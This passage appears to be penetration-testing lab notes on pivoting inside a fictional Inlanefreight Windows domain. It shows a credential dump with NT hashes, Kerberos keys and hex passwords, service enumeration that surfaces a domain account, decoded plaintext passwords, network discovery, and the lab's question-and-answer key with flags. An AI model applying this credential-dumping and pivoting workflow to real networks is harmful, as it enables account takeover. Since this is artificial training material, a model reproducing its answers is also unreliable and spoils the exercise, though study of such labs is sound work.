> sid S-1-5-96-0-1
> luid 44307
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [ad13]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [ad13]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 44248 (acd8)
> session_id 0
> username UMFD-0
> domainname Font Driver Host
> logon_server 
> logon_time 2026-09-10T08:49:58.259418+00:00
> sid S-1-5-96-0-0
> luid 44248
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [acd8]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [acd8]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> ```

- To understand which account might pave the way to domain admin, enumerate services running on the system and filter out standard build-in accounts:

```bash
PS C:\Users\mlefay> Get-CimInstance Win32_Service | Select-Object Name,StartName,DisplayName,State,StartMode,PathName | Where-Object { $_.StartName -notmatch "LocalSystem|NetworkService|LocalService" -and $_.StartMode -eq "Auto" }


Name        : SCardSvr
StartName   : INLANEFREIGHT\vfrank
DisplayName : Smart Card
State       : Stopped
StartMode   : Auto
PathName    : C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation

Name        : CDPUserSvc_e26ce
StartName   :
DisplayName : Connected Devices Platform User Service_e26ce
State       : Running
StartMode   : Auto
PathName    : C:\Windows\system32\svchost.exe -k UnistackSvcGroup

Name        : WpnUserService_e26ce
StartName   :
DisplayName : Windows Push Notifications User Service_e26ce
State       : Running
StartMode   : Auto
PathName    : C:\Windows\system32\svchost.exe -k UnistackSvcGroup
```

- Converting `vfrank`'s password from hex to ASCII: `Imply wet Unmasked!`
- Look at the target's network interface configuration:

```powershell
PS C:\Users\mlefay> ipconfig
```

```powershell
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::3427:8445:188a:a7b3%4
   IPv4 Address. . . . . . . . . . . : 172.16.5.35
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.5.1

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::986:5ea2:d7f1:8c15%5
   IPv4 Address. . . . . . . . . . . : 172.16.6.35
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . :
```

- There's another address: `172.16.6.35`, so it makes sense to scan that subnet. Another live host: `172.16.6.25`.
- Connect to it using RDP on `172.16.5.35`.
- There, find `C:\Flag.txt`:

![[last_flag.png]]

## Questions

- Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.
	- `webadmin`
- Submit the credentials found in the user's home directory. (Format: user:password)
	- `mlefay:Plain Human work!`
- Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.
	- `172.16.5.35`
- Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.
	- `S1ngl3-Piv07-3@sy-Day`
- In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?
